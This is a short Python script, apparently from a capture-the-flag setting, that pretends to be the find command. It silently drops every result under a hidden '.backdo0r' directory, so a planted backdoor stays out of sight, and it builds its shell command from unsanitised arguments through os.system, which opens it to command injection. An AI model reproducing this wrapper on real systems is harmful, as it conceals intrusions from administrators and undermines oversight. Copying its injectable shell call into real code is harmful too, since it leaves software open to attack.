#!/usr/bin/python3
import sys
import os

cPATH="/home/ctf/.backdo0r"
try:
	i=sys.argv.index("-name")
	sys.argv[i+1]="\"{p}\"".format(p=sys.argv[i+1])
except:
	i=-1


os.system("/usr/bin/find "+" ".join(sys.argv[1:]) + " ! -path {cPATH}/*".format(cPATH=cPATH))
